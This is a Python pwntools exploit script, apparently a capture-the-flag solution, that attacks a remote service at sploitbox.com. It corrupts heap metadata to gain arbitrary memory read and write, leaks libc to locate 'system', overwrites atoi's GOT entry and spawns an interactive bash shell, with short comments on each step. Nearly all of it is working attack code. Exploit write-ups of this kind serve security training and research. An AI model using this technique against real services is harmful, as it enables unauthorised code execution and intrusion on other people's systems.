from pwn import *

#r = process("./beatmeonthedl")
r = remote('sploitbox.com', 10001)

r.recvuntil("Enter username: ")
r.sendline("mcfly")

r.recvuntil("Enter Pass: ")
r.sendline("awesnap")

def add_request(v):
	r.recvuntil("| ")
	r.sendline("1")

	r.recvuntil("Request text > ")
	r.send(v)

def del_request(v):
	r.recvuntil("| ")
	r.sendline("3")

	r.recvuntil("choice: ")
	r.sendline(str(v))

def update_request(i, v):
	r.recvuntil("| ")
	r.sendline("4")

	r.recvuntil("choice: ")
	r.sendline(str(i))

	r.recvuntil("data: ")
	r.send(v)


for i in range(7):
	add_request(p64(0x609E80)*7)

for i in range(6, 1, -1):
	del_request(i)

# The heap gets corrupted so that metadata about the next and previous chunk gets written in
# the reqlist list pointer array
update_request(0, "A" * 56 + p64(0x80) + p64(0x609E88) + p64(0x609E80) * 6)
del_request(1)
del_request(0)
add_request("123")

# Once the data is corrupted we can write pointer of our choice in the reqlist
# When we print the list, we will get the content at the specified pointer
def read_at_offset(offset):
	update_request(4, p64(offset))

	r.recvuntil("| ")
	r.sendline("2")
	r.recvuntil("0) ")

	return r.recvuntil("2)")[:-3] + "\x00"

def bytes_to_int(bts):
	return int(bts[::-1].encode("hex"), 16)

# Use DynELF with the leak function to located the offset of the "system" function
libc_ptr = bytes_to_int(read_at_offset(0x609958))
d = DynELF(read_at_offset, libc_ptr)
ptr = d.lookup('system')

# Replace atoi with the offset of "system" in the GOT.PLT
update_request(4, p64(0x6099D8))
update_request(0, p64(ptr))

# atoi is invoked with the value we send in the menu selection
# since we changed atoi to system, we can send "bash" and it 
# will invoke system("bash")
r.recvuntil("| ")
r.sendline("bash")

# Profit !
r.interactive()